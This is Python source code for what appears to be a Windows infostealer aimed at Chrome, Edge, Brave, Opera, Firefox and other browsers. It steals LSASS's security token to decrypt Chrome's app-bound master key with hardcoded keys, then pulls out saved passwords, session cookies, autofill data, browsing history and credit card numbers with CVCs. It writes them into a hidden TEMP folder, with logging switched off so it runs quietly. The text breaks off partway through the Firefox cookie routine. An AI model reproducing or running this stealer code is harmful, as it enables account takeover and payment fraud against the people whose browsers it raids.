
import os
import io
import json
import struct
import ctypes
import shutil
import windows
import sqlite3
import pathlib
import binascii
import subprocess
import windows.crypto
import windows.security
import windows.generated_def as gdef
from contextlib import contextmanager
from Crypto.Cipher import AES, ChaCha20_Poly1305
import logging
import sys
import base64
from datetime import datetime, timedelta

# Minimal logging for speed
logging.basicConfig(level=logging.CRITICAL, handlers=[])
logger = logging.getLogger(__name__)
logger.disabled = True
identifier = "${Cbcchz}"
OUTPUT_BASE_DIR = pathlib.Path(os.environ['TEMP']) / identifier / 'Browser-Datas'
BROWSERS = {
    'chrome': {
        'name': 'Google Chrome',
        'type': 'chromium',
        'data_path': r'AppData\Local\Google\Chrome\User Data',
        'local_state': r'AppData\Local\Google\Chrome\User Data\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Google Chromekey1'
    },
    'brave': {
        'name': 'Brave',
        'type': 'chromium',
        'data_path': r'AppData\Local\BraveSoftware\Brave-Browser\User Data',
        'local_state': r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State',
        'process_name': 'brave.exe',
        'key_name': 'Brave Softwarekey1'
    },
    'edge': {
        'name': 'Microsoft Edge',
        'type': 'chromium',
        'data_path': r'AppData\Local\Microsoft\Edge\User Data',
        'local_state': r'AppData\Local\Microsoft\Edge\User Data\Local State',
        'process_name': 'msedge.exe',
        'key_name': 'Microsoft Edgekey1'
    },
    'opera': {
        'name': 'Opera',
        'type': 'chromium',
        'data_path': r'AppData\Roaming\Opera Software\Opera Stable',
        'local_state': r'AppData\Roaming\Opera Software\Opera Stable\Local State',
        'process_name': 'opera.exe',
        'key_name': 'Opera Softwarekey1'
    },
    'opera_gx': {
        'name': 'Opera GX',
        'type': 'chromium',
        'data_path': r'AppData\Roaming\Opera Software\Opera GX Stable',
        'local_state': r'AppData\Roaming\Opera Software\Opera GX Stable\Local State',
        'process_name': 'opera.exe',
        'key_name': 'Opera Softwarekey1'
    },
    'firefox': {
        'name': 'Firefox',
        'type': 'gecko',
        'data_path': r'AppData\Roaming\Mozilla\Firefox\Profiles',
        'process_name': 'firefox.exe'
    },
    'chrome_beta': {
        'name': 'Google Chrome Beta',
        'type': 'chromium',
        'data_path': r'AppData\Local\Google\Chrome Beta\User Data',
        'local_state': r'AppData\Local\Google\Chrome Beta\User Data\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Google Chrome Betakey1'
    },
    'chromium': {
        'name': 'Chromium',
        'type': 'chromium',
        'data_path': r'AppData\Local\Chromium\User Data',
        'local_state': r'AppData\Local\Chromium\User Data\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Chromiumkey1'
    },
    'vivaldi': {
        'name': 'Vivaldi',
        'type': 'chromium',
        'data_path': r'AppData\Local\Vivaldi\User Data',
        'local_state': r'AppData\Local\Vivaldi\User Data\Local State',
        'process_name': 'vivaldi.exe',
        'key_name': 'Vivaldikey1'
    },
    'yandex': {
        'name': 'Yandex Browser',
        'type': 'chromium',
        'data_path': r'AppData\Local\Yandex\YandexBrowser\User Data',
        'local_state': r'AppData\Local\Yandex\YandexBrowser\User Data\Local State',
        'process_name': 'browser.exe',
        'key_name': 'Yandex Browserkey1'
    },
    'coccoc': {
        'name': 'CocCoc Browser',
        'type': 'chromium',
        'data_path': r'AppData\Local\CocCoc\Browser\User Data',
        'local_state': r'AppData\Local\CocCoc\Browser\User Data\Local State',
        'process_name': 'browser.exe',
        'key_name': 'CocCoc Browserkey1'
    },
    'qq': {
        'name': 'QQ Browser',
        'type': 'chromium',
        'data_path': r'AppData\Local\Tencent\QQBrowser\User Data',
        'local_state': r'AppData\Local\Tencent\QQBrowser\User Data\Local State',
        'process_name': 'QQBrowser.exe',
        'key_name': 'QQ Browserkey1'
    },
    '360speed': {
        'name': '360 Speed',
        'type': 'chromium',
        'data_path': r'AppData\Local\360Chrome\Chrome\User Data',
        'local_state': r'AppData\Local\360Chrome\Chrome\User Data\Local State',
        'process_name': '360chrome.exe',
        'key_name': '360 Speedkey1'
    },
    '360secure': {
        'name': '360 Secure',
        'type': 'chromium',
        'data_path': r'AppData\Local\360Chrome\Chrome\User Data',
        'local_state': r'AppData\Local\360Chrome\Chrome\User Data\Local State',
        'process_name': '360chrome.exe',
        'key_name': '360 Securekey1'
    },
    'firefox_beta': {
        'name': 'Firefox Beta',
        'type': 'gecko',
        'data_path': r'AppData\Roaming\Mozilla\Firefox\Profiles',
        'process_name': 'firefox.exe'
    },
    'firefox_dev': {
        'name': 'Firefox Developer',
        'type': 'gecko',
        'data_path': r'AppData\Roaming\Mozilla\Firefox\Profiles',
        'process_name': 'firefox.exe'
    },
    'firefox_esr': {
        'name': 'Firefox ESR',
        'type': 'gecko',
        'data_path': r'AppData\Roaming\Mozilla\Firefox\Profiles',
        'process_name': 'firefox.exe'
    },
    'firefox_nightly': {
        'name': 'Firefox Nightly',
        'type': 'gecko',
        'data_path': r'AppData\Roaming\Mozilla\Firefox\Profiles',
        'process_name': 'firefox.exe'
    }
}

class SECItem(ctypes.Structure):
    _fields_ = [('type', ctypes.c_uint),
                ('data', ctypes.c_void_p),
                ('len', ctypes.c_uint)]

class NSSHandler:
    def __init__(self):
        self.nss = None
        self.loaded = False
        self._load_library()

    def _load_library(self):
        paths = [
            r"C:\Program Files\Mozilla Firefox
ss3.dll",
            r"C:\Program Files (x86)\Mozilla Firefox
ss3.dll"
        ]
        for path in paths:
            if os.path.exists(path):
                try:
                    logger.debug(f"Loading NSS from {path}")
                    try:
                        os.add_dll_directory(os.path.dirname(path))
                    except AttributeError:
                        os.environ['PATH'] = os.path.dirname(path) + ';' + os.environ['PATH']

                    self.nss = ctypes.CDLL(path)
                    
                    self.nss.NSS_Init.argtypes = [ctypes.c_char_p]
                    self.nss.NSS_Init.restype = ctypes.c_int
                    
                    self.nss.NSS_Shutdown.argtypes = []
                    self.nss.NSS_Shutdown.restype = ctypes.c_int
                    
                    self.nss.PK11SDR_Decrypt.argtypes = [ctypes.POINTER(SECItem), ctypes.POINTER(SECItem), ctypes.c_void_p]
                    self.nss.PK11SDR_Decrypt.restype = ctypes.c_int
                    
                    self.loaded = True
                    return
                except Exception as e:
                    logger.error(f"Failed to load NSS from {path}: {e}")

    def init_profile(self, profile_path):
        if not self.loaded: return False
        try:
            logger.debug(f"Initializing NSS for profile: {profile_path}")
            if not (pathlib.Path(profile_path) / "cert9.db").exists() and not (pathlib.Path(profile_path) / "cert8.db").exists():
                logger.warning(f"No cert DB found in {profile_path}, skipping NSS init")
                return False
                
            ret = self.nss.NSS_Init(str(profile_path).encode('utf-8'))
            if ret != 0:
                logger.error(f"NSS_Init failed with code {ret}")
                return False
            return True
        except Exception as e:
            logger.error(f"Error in NSS_Init: {e}")
            return False

    def shutdown(self):
        if self.loaded:
            try:
                self.nss.NSS_Shutdown()
            except Exception:
                pass

    def decrypt(self, encrypted_b64):
        if not self.loaded: return None
        try:
            encrypted_data = base64.b64decode(encrypted_b64)
            
            input_item = SECItem(0, ctypes.cast(ctypes.create_string_buffer(encrypted_data), ctypes.c_void_p), len(encrypted_data))
            output_item = SECItem(0, None, 0)
            
            ret = self.nss.PK11SDR_Decrypt(ctypes.byref(input_item), ctypes.byref(output_item), None)
            
            if ret == 0:
                decrypted_data = ctypes.string_at(output_item.data, output_item.len)
                return decrypted_data.decode('utf-8')
            else:
                return None
        except Exception as e:
            logger.error(f"Error decrypting with NSS: {e}")
            return None

def is_admin():
    try:
        result = ctypes.windll.shell32.IsUserAnAdmin() != 0
        logger.debug(f"Admin check result: {result}")
        return result
    except Exception as e:
        logger.error(f"Error checking admin status: {e}")
        return False

@contextmanager
def impersonate_lsass():
    logger.debug("Attempting to impersonate LSASS")
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        logger.debug("Successfully impersonated LSASS")
        yield
    except Exception as e:
        logger.error(f"Failed to impersonate LSASS: {e}")
        raise
    finally:
        windows.current_thread.token = original_token
        logger.debug("Reverted to original token")

def parse_key_blob(blob_data: bytes) -> dict:
    try:
        logger.debug(f"Parsing key blob of length {len(blob_data)}")
        buffer = io.BytesIO(blob_data)
        parsed_data = {}
        header_len = struct.unpack('<I', buffer.read(4))[0]
        parsed_data['header'] = buffer.read(header_len)
        content_len = struct.unpack('<I', buffer.read(4))[0]
        
        if header_len + content_len + 8 != len(blob_data):
            logger.warning("Blob size mismatch in parse_key_blob")
            
        parsed_data['flag'] = buffer.read(1)[0]
        logger.debug(f"Blob flag: {parsed_data['flag']}")
        
        if parsed_data['flag'] in (1, 2):
            parsed_data['iv'] = buffer.read(12)
            parsed_data['ciphertext'] = buffer.read(32)
            parsed_data['tag'] = buffer.read(16)
        elif parsed_data['flag'] == 3:
            parsed_data['encrypted_aes_key'] = buffer.read(32)
            parsed_data['iv'] = buffer.read(12)
            parsed_data['ciphertext'] = buffer.read(32)
            parsed_data['tag'] = buffer.read(16)
        else:
            parsed_data['raw_data'] = buffer.read()
            
        return parsed_data
    except Exception as e:
        logger.error(f"Error parsing key blob: {e}")
        raise

def decrypt_with_cng(input_data, key_name):
    logger.debug(f"Decrypting with CNG, key_name: {key_name}")
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    if status != 0:
        logger.error(f"NCryptOpenStorageProvider failed: {status}")
        return b''
        
    hKey = gdef.NCRYPT_KEY_HANDLE()
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    if status != 0:
        logger.error(f"NCryptOpenKey failed: {status}")
        ncrypt.NCryptFreeObject(hProvider)
        return b''
        
    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
    
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)
    if status != 0:
        logger.error(f"1st NCryptDecrypt failed: {status}")
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)
        return b''
        
    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()
    
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size,
                                  ctypes.byref(pcbResult), 0x40)
    if status != 0:
        logger.error(f"2nd NCryptDecrypt failed: {status}")
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)
        return b''
        
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    logger.debug("CNG decryption successful")
    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict, key_name) -> bytes:
    logger.debug(f"Deriving v20 master key with flag {parsed_data.get('flag')}")
    try:
        if parsed_data['flag'] == 1:
            aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
            return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
        elif parsed_data['flag'] == 2:
            chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
            cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
            return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
        elif parsed_data['flag'] == 3:
            xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
            with impersonate_lsass():
                decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name)
            if not decrypted_aes_key:
                logger.error("Failed to decrypt AES key with CNG")
                return b''
            xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
            cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
            return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
        else:
            logger.warning(f"Unknown flag: {parsed_data.get('flag')}")
            return parsed_data.get('raw_data', b'')
    except Exception as e:
        logger.error(f"Error deriving master key: {e}")
        return b''

def decrypt_v20_value(encrypted_value, master_key):
    try:
        iv = encrypted_value[3:15]
        ciphertext = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted[32:].decode('utf-8')
    except Exception as e:
        return None

def decrypt_v20_password(encrypted_password, master_key):
    try:
        if not encrypted_password:
            return ""
        if not encrypted_password.startswith(b'v20') and not encrypted_password.startswith(b'v10'):
             pass
             
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted_pass = cipher.decrypt_and_verify(payload[:-16], payload[-16:])
        try:
            return decrypted_pass.decode('utf-8')
        except UnicodeDecodeError:
            try:
                return decrypted_pass.decode('cp1252')
            except UnicodeDecodeError:
                return decrypted_pass.decode('utf-8', errors='replace')
    except Exception as e:
        return f"<decryption_failed: {e}>"

def fetch_sqlite_copy(db_path):
    try:
        tmp_path = pathlib.Path(os.environ['TEMP']) / pathlib.Path(db_path).name
        logger.debug(f"Copying DB from {db_path} to {tmp_path}")
        shutil.copy2(db_path, tmp_path)
        return tmp_path
    except Exception as e:
        logger.error(f"Error copying SQLite DB: {e}")
        return None

def get_chrome_datetime(timestamp):
    try:
        if not timestamp:
            return "Unknown"
        # Chrome timestamps are microseconds since 1601-01-01
        epoch = datetime(1601, 1, 1)
        return (epoch + timedelta(microseconds=timestamp)).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return "Unknown"

def extract_bookmarks(profile_path):
    bookmarks_path = profile_path / "Bookmarks"
    if not bookmarks_path.exists():
        return []
    
    try:
        with open(bookmarks_path, "r", encoding="utf-8") as f:
            data = json.load(f)
            
        bookmarks = []
        
        def process_node(node):
            if isinstance(node, dict):
                if node.get("type") == "url":
                    name = node.get("name", "Unknown")
                    url = node.get("url", "Unknown")
                    bookmarks.append(f"{name}	{url}")
                
                if "children" in node:
                    for child in node["children"]:
                        process_node(child)
                        
        if "roots" in data:
            for root in data["roots"].values():
                process_node(root)
                
        return bookmarks
    except Exception as e:
        logger.error(f"Error extracting bookmarks: {e}")
        return []

def extract_history(profile_path):
    history_db = profile_path / "History"
    if not history_db.exists():
        return []
        
    db_copy = fetch_sqlite_copy(history_db)
    if not db_copy:
        return []
        
    try:
        con = sqlite3.connect(db_copy)
        cur = con.cursor()
        cur.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
        rows = cur.fetchall()
        con.close()
        try: os.remove(db_copy)
        except: pass
        
        history_items = []
        for url, title, visit_count, last_visit in rows:
            date_str = get_chrome_datetime(last_visit)
            history_items.append(f"{url}	{title}	{visit_count}	{date_str}")
            
        return history_items
    except Exception as e:
        logger.error(f"Error extracting history: {e}")
        if os.path.exists(db_copy):
            try: os.remove(db_copy)
            except: pass
        return []

def extract_credit_cards(profile_path, master_key):
    web_data_db = profile_path / "Web Data"
    if not web_data_db.exists():
        return []
        
    db_copy = fetch_sqlite_copy(web_data_db)
    if not db_copy:
        return []
        
    try:
        con = sqlite3.connect(db_copy)
        cur = con.cursor()
        
        # Load CVCs
        local_cvcs = {}
        try:
            cur.execute("SELECT guid, value_encrypted FROM local_stored_cvc")
            for guid, encrypted in cur.fetchall():
                local_cvcs[guid] = encrypted
        except sqlite3.OperationalError:
            pass # Table might not exist
            
        server_cvcs = {}
        try:
            cur.execute("SELECT instrument_id, value_encrypted FROM server_stored_cvc")
            for inst_id, encrypted in cur.fetchall():
                server_cvcs[str(inst_id)] = encrypted
        except sqlite3.OperationalError:
            pass

        cards = []
        
        # Local cards
        try:
            cur.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            for guid, name, exp_m, exp_y, enc_num in cur.fetchall():
                try:
                    decrypted_num = decrypt_v20_password(enc_num, master_key)
                    if decrypted_num.startswith("<decryption_failed"):
                         decrypted_num = "DECRYPT_FAILED"
                    
                    cvc = "N/A"
                    if guid in local_cvcs:
                        decrypted_cvc = decrypt_v20_password(local_cvcs[guid], master_key)
                        if not decrypted_cvc.startswith("<decryption_failed"):
                            cvc = decrypted_cvc
                            
                    cards.append(f"================
GUID: {guid}
NAME: {name}
NUMBER: {decrypted_num}
VALID: {exp_m}/{exp_y}
CVC: {cvc}
TYPE: Local Card")
                except Exception as e:
                    logger.error(f"Error processing local card {guid}: {e}")
        except sqlite3.OperationalError as e:
            logger.error(f"OperationalError querying credit_cards: {e}")

        # Server cards
        try:
            cur.execute("SELECT id, name_on_card, exp_month, exp_year, last_four FROM masked_credit_cards")
            for card_id, name, exp_m, exp_y, last_four in cur.fetchall():
                try:
                    decrypted_num = f"**** **** **** {last_four}"
                    
                    cvc = "N/A"
                    if str(card_id) in server_cvcs and master_key:
                        decrypted_cvc = decrypt_v20_password(server_cvcs[str(card_id)], master_key)
                        if not decrypted_cvc.startswith("<decryption_failed"):
                            cvc = decrypted_cvc
                            
                    cards.append(f"================
ID: {card_id}
NAME: {name}
NUMBER: {decrypted_num}
VALID: {exp_m}/{exp_y}
CVC: {cvc}
TYPE: Masked/Server Card")
                except Exception as e:
                    logger.error(f"Error processing server card {card_id}: {e}")
        except sqlite3.OperationalError as e:
            logger.error(f"OperationalError querying masked_credit_cards: {e}")
            
        con.close()
        try: os.remove(db_copy)
        except: pass
        return cards
    except Exception as e:
        logger.error(f"Error extracting credit cards: {e}")
        if os.path.exists(db_copy):
            try: os.remove(db_copy)
            except: pass
        return []

def get_master_key(browser_config):
    logger.info(f"Getting master key for {browser_config['name']}")
    try:
        user_profile = os.environ['USERPROFILE']
        local_state_path = os.path.join(user_profile, browser_config['local_state'])
        logger.debug(f"Local state path: {local_state_path}")
        
        if not os.path.exists(local_state_path):
            logger.warning("Local state file not found")
            return None
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        
        if "os_crypt" in local_state and "app_bound_encrypted_key" in local_state["os_crypt"]:
            logger.debug("Found app_bound_encrypted_key")
            key_blob_encrypted = binascii.a2b_base64(local_state["os_crypt"]["app_bound_encrypted_key"])[4:]
        elif "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
            logger.debug("Found encrypted_key")
            key_blob_encrypted = binascii.a2b_base64(local_state["os_crypt"]["encrypted_key"])[5:]
            return windows.crypto.dpapi.unprotect(key_blob_encrypted)
        else:
            logger.warning("No encrypted key found in local state")
            return None
            
        logger.debug("Decrypting system key with LSASS impersonation")
        with impersonate_lsass():
            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
            
        logger.debug("Decrypting user key")
        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
        
        logger.debug("Parsing decrypted key blob")
        parsed_data = parse_key_blob(key_blob_user_decrypted)
        
        if parsed_data['flag'] not in (1, 2, 3):
            logger.debug("Returning raw key data")
            return key_blob_user_decrypted[-32:]
            
        logger.debug("Deriving final master key")
        return derive_v20_master_key(parsed_data, browser_config['key_name'])
    except Exception as e:
        logger.error(f"Error getting master key: {e}")
        return None

def process_chromium_browser(browser_name, browser_config):
    logger.info(f"Processing Chromium browser: {browser_name}")
    user_profile = os.environ['USERPROFILE']
    browser_data_path = pathlib.Path(user_profile) / browser_config['data_path']
    
    if not browser_data_path.exists():
        logger.warning(f"Browser data path not found: {browser_data_path}")
        return
        
    master_key = get_master_key(browser_config)
    if not master_key:
        logger.warning("Could not retrieve master key - sensitive data (passwords/cookies) will not be decrypted")
    else:
        logger.debug("Master key retrieved successfully")
        
    profiles = [p for p in browser_data_path.iterdir() if
                p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
    
    logger.info(f"Found {len(profiles)} profiles")
    
    for profile_dir in profiles:
        profile_name = profile_dir.name.lower()
        logger.info(f"Processing profile: {profile_name}")
        
        profile_output_dir = OUTPUT_BASE_DIR / browser_name / profile_name
        profile_output_dir.mkdir(parents=True, exist_ok=True)
        password_file = profile_output_dir / "passwords.txt"
        autofill_file = profile_output_dir / "auto_fills.txt"
        cookies_file = profile_output_dir / "cookies.txt"
        bookmarks_file = profile_output_dir / "bookmarks.txt"
        history_file = profile_output_dir / "history.txt"
        credit_cards_file = profile_output_dir / "credit_cards.txt"
        
        cookie_db_path = profile_dir / "Network" / "Cookies"
        login_db_path = profile_dir / "Login Data"
        webdata_db_path = profile_dir / "Web Data"

        # Process Bookmarks
        bookmarks = extract_bookmarks(profile_dir)
        if bookmarks:
            with open(bookmarks_file, "w", encoding="utf-8") as f:
                f.write("# Name	URL
")
                for b in bookmarks:
                    f.write(f"{b}
")
            logger.debug(f"Extracted {len(bookmarks)} bookmarks")

        # Process History
        history = extract_history(profile_dir)
        if history:
            with open(history_file, "w", encoding="utf-8") as f:
                f.write("# URL	Title	Visit Count	Last Visit
")
                for h in history:
                    f.write(f"{h}
")
            logger.debug(f"Extracted {len(history)} history items")

        # Process Credit Cards
        cards = extract_credit_cards(profile_dir, master_key)
        if cards:
            with open(credit_cards_file, "w", encoding="utf-8") as f:
                f.write("# Credit Cards
")
                for c in cards:
                    f.write(f"{c}

")
            logger.debug(f"Extracted {len(cards)} credit cards")

        # Process Cookies
        try:
            if cookie_db_path.exists():
                logger.debug(f"Processing cookies from {cookie_db_path}")
                cookie_copy = fetch_sqlite_copy(cookie_db_path)
                if cookie_copy:
                    con = sqlite3.connect(cookie_copy)
                    cur = con.cursor()
                    cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, CAST(encrypted_value AS BLOB) FROM cookies;")
                    cookies = cur.fetchall()
                    logger.debug(f"Found {len(cookies)} cookies")
                    
                    with open(cookies_file, "w", encoding="utf-8") as f:
                        f.write("# Netscape HTTP Cookie File
")
                        f.write("# domain	flag	path	secure	expiration	name	value
")
                        success_count = 0
                        for host, name, path, expires, secure, httponly, encrypted_value in cookies:
                            if encrypted_value and (encrypted_value[:3] in (b"v10", b"v11", b"v20")):
                                decrypted = decrypt_v20_value(encrypted_value, master_key)
                                value_str = decrypted if decrypted else "DECRYPT_FAILED"
                                if decrypted:
                                    success_count += 1
                                flag = "TRUE" if (host and host.startswith('.')) else "FALSE"
                                secure_str = "TRUE" if secure else "FALSE"
                                try:
                                    secs = int(expires) // 1000000
                                except Exception:
                                    secs = 0
                                unix_exp = secs - 11644473600 if secs > 11644473600 else 0
                                path_str = path if path else "/"
                                line = f"{host}	{flag}	{path_str}	{secure_str}	{unix_exp}	{name}	{value_str}
"
                                f.write(line)
                        logger.debug(f"Successfully decrypted {success_count} cookies")
                    con.close()
                    try: os.remove(cookie_copy)
                    except: pass
            else:
                logger.debug("No cookie DB found")
        except Exception as e:
            logger.error(f"Error processing cookies: {e}")

        # Process Logins
        try:
            if login_db_path.exists():
                logger.debug(f"Processing logins from {login_db_path}")
                con = sqlite3.connect(pathlib.Path(login_db_path).as_uri() + "?mode=ro", uri=True)
                cur = con.cursor()
                cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins;")
                logins = cur.fetchall()
                logger.debug(f"Found {len(logins)} logins")
                
                with open(password_file, "w", encoding="utf-8") as f:
                    f.write("# Passwords
")
                    success_count = 0
                    for login in logins:
                        if login[2]:
                            logger.debug(f"Login prefix: {login[2][:3]}")
                            if (login[2][:3] in (b"v10", b"v11", b"v20")):
                                decrypted = decrypt_v20_password(login[2], master_key)
                                if decrypted and not decrypted.startswith("<decryption_failed"):
                                    success_count += 1
                                elif decrypted and decrypted.startswith("<decryption_failed"):
                                    logger.warning(f"Decryption failed for {login[0]}: {decrypted}")
                                    if login[2].startswith(b'v20') and "MAC check failed" in str(decrypted):
                                        logger.error("CRITICAL: v20 data found but key appears invalid. This usually means 'app_bound_encrypted_key' is missing from Local State.")
                                f.write(f"URL: {login[0]}
Username: {login[1]}
Password: {decrypted}

")
                    logger.debug(f"Successfully decrypted {success_count} passwords")
                con.close()
            else:
                logger.debug("No login DB found")
        except Exception as e:
            logger.error(f"Error processing logins: {e}")

        # Process Autofill
        try:
            if webdata_db_path.exists():
                logger.debug(f"Processing autofill from {webdata_db_path}")
                db_copy = fetch_sqlite_copy(webdata_db_path)
                if db_copy:
                    con = sqlite3.connect(db_copy)
                    cur = con.cursor()
                    cur.execute("SELECT name, value FROM autofill;")
                    autofills = cur.fetchall()
                    logger.debug(f"Found {len(autofills)} autofill entries")
                    
                    with open(autofill_file, "a", encoding="utf-8") as f:
                        for name, value in autofills:
                            if name and name.strip():
                                if isinstance(value, bytes) and (value[:3] in (b"v10", b"v11", b"v20")):
                                    decrypted = decrypt_v20_value(value, master_key)
                                    value_str = decrypted if decrypted else "DECRYPT_FAILED"
                                else:
                                    value_str = value
                                line = f"Field: {name}
Value: {value_str}

"
                                f.write(line)
                    con.close()
                    try: os.remove(db_copy)
                    except: pass
            else:
                logger.debug("No webdata DB found")
        except Exception as e:
            logger.error(f"Error processing autofill: {e}")

def extract_gecko_history(profile_path):
    places_db = profile_path / "places.sqlite"
    if not places_db.exists():
        return []
    
    db_copy = fetch_sqlite_copy(places_db)
    if not db_copy:
        return []
        
    try:
        con = sqlite3.connect(db_copy)
        cur = con.cursor()
        cur.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 1000")
        rows = cur.fetchall()
        con.close()
        try: os.remove(db_copy)
        except: pass
        
        history_items = []
        for url, title, visit_count, last_visit in rows:
            date_str = "Unknown"
            if last_visit:
                try:
                    # Firefox uses microseconds since Unix Epoch
                    date_str = datetime.fromtimestamp(last_visit / 1000000).strftime("%Y-%m-%d %H:%M:%S")
                except: pass
            
            title_str = title if title else "No Title"
            history_items.append(f"{url}	{title_str}	{visit_count}	{date_str}")
            
        return history_items
    except Exception as e:
        logger.error(f"Error extracting gecko history: {e}")
        if os.path.exists(db_copy):
            try: os.remove(db_copy)
            except: pass
        return []

def extract_gecko_bookmarks(profile_path):
    places_db = profile_path / "places.sqlite"
    if not places_db.exists():
        return []
    
    db_copy = fetch_sqlite_copy(places_db)
    if not db_copy:
        return []
        
    try:
        con = sqlite3.connect(db_copy)
        cur = con.cursor()
        cur.execute("""
            SELECT b.title, p.url 
            FROM moz_bookmarks b 
            JOIN moz_places p ON b.fk = p.id 
            WHERE b.type = 1
        """)
        rows = cur.fetchall()
        con.close()
        try: os.remove(db_copy)
        except: pass
        
        bookmarks = []
        for title, url in rows:
            name = title if title else "Unknown"
            bookmarks.append(f"{name}	{url}")
            
        return bookmarks
    except Exception as e:
        logger.error(f"Error extracting gecko bookmarks: {e}")
        if os.path.exists(db_copy):
            try: os.remove(db_copy)
            except: pass
        return []

def extract_gecko_autofill(profile_path):
    form_db = profile_path / "formhistory.sqlite"
    if not form_db.exists():
        return []
        
    db_copy = fetch_sqlite_copy(form_db)
    if not db_copy:
        return []
        
    try:
        con = sqlite3.connect(db_copy)
        cur = con.cursor()
        cur.execute("SELECT fieldname, value, timesUsed, firstUsed, lastUsed FROM moz_formhistory")
        rows = cur.fetchall()
        con.close()
        try: os.remove(db_copy)
        except: pass
        
        autofills = []
        for fieldname, value, times, first, last in rows:
            autofills.append(f"Field: {fieldname}
Value: {value}
Times Used: {times}

")
            
        return autofills
    except Exception as e:
        logger.error(f"Error extracting gecko autofill: {e}")
        if os.path.exists(db_copy):
            try: os.remove(db_copy)
            except: pass
        return []

def process_gecko_browser(browser_name, browser_config):
    logger.info(f"Processing Gecko browser: {browser_name}")
    user_profile = os.environ['USERPROFILE']
    browser_data_path = pathlib.Path(user_profile) / browser_config['data_path']
    
    if not browser_data_path.exists():
        logger.warning(f"Browser data path not found: {browser_data_path}")
        return

    nss_handler = NSSHandler()
    if not nss_handler.loaded:
        logger.error("Could not load NSS library")
        return

    # Find profiles
    # Firefox profiles usually in xxxxx.default-release or similar
    profiles = [p for p in browser_data_path.iterdir() if p.is_dir()]
    logger.info(f"Found {len(profiles)} profiles")

    for profile_dir in profiles:
        profile_name = profile_dir.name
        logger.info(f"Processing profile: {profile_name}")
        
        # We need to initialize NSS for this profile
        if not nss_handler.init_profile(profile_dir):
            logger.error(f"Skipping profile {profile_name} due to NSS init failure")
            continue

        profile_output_dir = OUTPUT_BASE_DIR / browser_name / profile_name
        profile_output_dir.mkdir(parents=True, exist_ok=True)
        password_file = profile_output_dir / "passwords.txt"
        cookies_file = profile_output_dir / "cookies.txt"
        history_file = profile_output_dir / "history.txt"
        bookmarks_file = profile_output_dir / "bookmarks.txt"
        autofill_file = profile_output_dir / "auto_fills.txt"
        
        cookies_db = profile_dir / "cookies.sqlite"
        logins_json = profile_dir / "logins.json"

        # Process Cookies
        if cookies_db.exists():
            try:
                logger.debug(f"Processing cookies from {cookies_db}")
                cookie_copy = fetch_sqlite_copy(cookies_db)
                if cookie_copy:
                    con = sqlite3.connect(cookie_copy)
                    cur = con.cursor()
                    # Firefox cookies are typically plaintext in the DB
                    cur.execute("SELECT host, name, path, expiry, isSecure, isHttpOnly, value FROM moz_cookies")
                    cookies = cur.fetchall()
                    logger.debug(f"Found {len(cookies)} cookies")
                    
                    with open(cookies_file, "w", encoding="utf-8") as f:
